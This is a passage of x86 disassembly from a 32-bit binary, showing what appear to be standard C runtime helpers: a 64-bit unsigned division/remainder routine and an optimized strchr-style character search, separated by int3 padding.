  428afb:	mov    eax,DWORD PTR [esp+0x8]
  428aff:	shr    ecx,1
  428b01:	rcr    ebx,1
  428b03:	shr    edx,1
  428b05:	rcr    eax,1
  428b07:	or     ecx,ecx
  428b09:	jne    0x428aff
  428b0b:	div    ebx
  428b0d:	mov    esi,eax
  428b0f:	mul    DWORD PTR [esp+0x14]
  428b13:	mov    ecx,eax
  428b15:	mov    eax,DWORD PTR [esp+0x10]
  428b19:	mul    esi
  428b1b:	add    edx,ecx
  428b1d:	jb     0x428b2d
  428b1f:	cmp    edx,DWORD PTR [esp+0xc]
  428b23:	ja     0x428b2d
  428b25:	jb     0x428b36
  428b27:	cmp    eax,DWORD PTR [esp+0x8]
  428b2b:	jbe    0x428b36
  428b2d:	dec    esi
  428b2e:	sub    eax,DWORD PTR [esp+0x10]
  428b32:	sbb    edx,DWORD PTR [esp+0x14]
  428b36:	xor    ebx,ebx
  428b38:	sub    eax,DWORD PTR [esp+0x8]
  428b3c:	sbb    edx,DWORD PTR [esp+0xc]
  428b40:	neg    edx
  428b42:	neg    eax
  428b44:	sbb    edx,0x0
  428b47:	mov    ecx,edx
  428b49:	mov    edx,ebx
  428b4b:	mov    ebx,ecx
  428b4d:	mov    ecx,eax
  428b4f:	mov    eax,esi
  428b51:	pop    esi
  428b52:	ret    0x10
  428b55:	int3   
  428b56:	int3   
  428b57:	int3   
  428b58:	int3   
  428b59:	int3   
  428b5a:	int3   
  428b5b:	int3   
  428b5c:	int3   
  428b5d:	int3   
  428b5e:	int3   
  428b5f:	int3   
  428b60:	lea    eax,[edx-0x1]
  428b63:	pop    ebx
  428b64:	ret    
  428b65:	lea    esp,[esp+0x0]
  428b6c:	lea    esp,[esp+0x0]
  428b70:	xor    eax,eax
  428b72:	mov    al,BYTE PTR [esp+0x8]
  428b76:	push   ebx
  428b77:	mov    ebx,eax
  428b79:	shl    eax,0x8
  428b7c:	mov    edx,DWORD PTR [esp+0x8]
  428b80:	test   edx,0x3
  428b86:	je     0x428b9d
  428b88:	mov    cl,BYTE PTR [edx]
  428b8a:	add    edx,0x1
  428b8d:	cmp    cl,bl
  428b8f:	je     0x428b60
  428b91:	test   cl,cl
  428b93:	je     0x428be6
  428b95:	test   edx,0x3
  428b9b:	jne    0x428b88
  428b9d:	or     ebx,eax
  428b9f:	push   edi
  428ba0:	mov    eax,ebx
  428ba2:	shl    ebx,0x10
  428ba5:	push   esi
  428ba6:	or     ebx,eax
  428ba8:	mov    ecx,DWORD PTR [edx]
  428baa:	mov    edi,0x7efefeff
  428baf:	mov    eax,ecx
  428bb1:	mov    esi,edi
  428bb3:	xor    ecx,ebx
  428bb5:	add    esi,eax
  428bb7:	add    edi,ecx
  428bb9:	xor    ecx,0xffffffff
  428bbc:	xor    eax,0xffffffff
  428bbf:	xor    ecx,edi
  428bc1:	xor    eax,esi
  428bc3:	add    edx,0x4
  428bc6:	and    ecx,0x81010100
  428bcc:	jne    0x428bea
  428bce:	and    eax,0x81010100
  428bd3:	je     0x428ba8
  428bd5:	and    eax,0x1010100
  428bda:	jne    0x428be4
  428bdc:	and    esi,0x80000000
  428be2:	jne    0x428ba8
  428be4:	pop    esi
  428be5:	pop    edi
  428be6:	pop    ebx
  428be7:	xor    eax,eax
  428be9:	ret    
  428bea:	mov    eax,DWORD PTR [edx-0x4]
  428bed:	cmp    al,bl
  428bef:	je     0x428c27
  428bf1:	test   al,al
  428bf3:	je     0x428be4
  428bf5:	cmp    ah,bl
  428bf7:	je     0x428c20
  428bf9:	test   ah,ah
  428bfb:	je     0x428be4
  428bfd:	shr    eax,0x10
  428c00:	cmp    al,bl
  428c02:	je     0x428c19
  428c04:	test   al,al
  428c06:	je     0x428be4
  428c08:	cmp    ah,bl
  428c0a:	je     0x428c12
  428c0c:	test   ah,ah
  428c0e:	je     0x428be4
  428c10:	jmp    0x428ba8
  428c12:	pop    esi
  428c13:	pop    edi
  428c14:	lea    eax,[edx-0x1]
  428c17:	pop    ebx
  428c18:	ret    
  428c19:	lea    eax,[edx-0x2]
  428c1c:	pop    esi
  428c1d:	pop    edi
  428c1e:	pop    ebx
  428c1f:	ret    
  428c20:	lea    eax,[edx-0x3]
  428c23:	pop    esi
  428c24:	pop    edi
  428c25:	pop    ebx
  428c26:	ret    
  428c27:	lea    eax,[edx-0x4]
  428c2a:	pop    esi
  428c2b:	pop    edi
  428c2c:	pop    ebx
  428c2d:	ret    
  428c2e:	jmp    DWORD PTR ds:0x429104
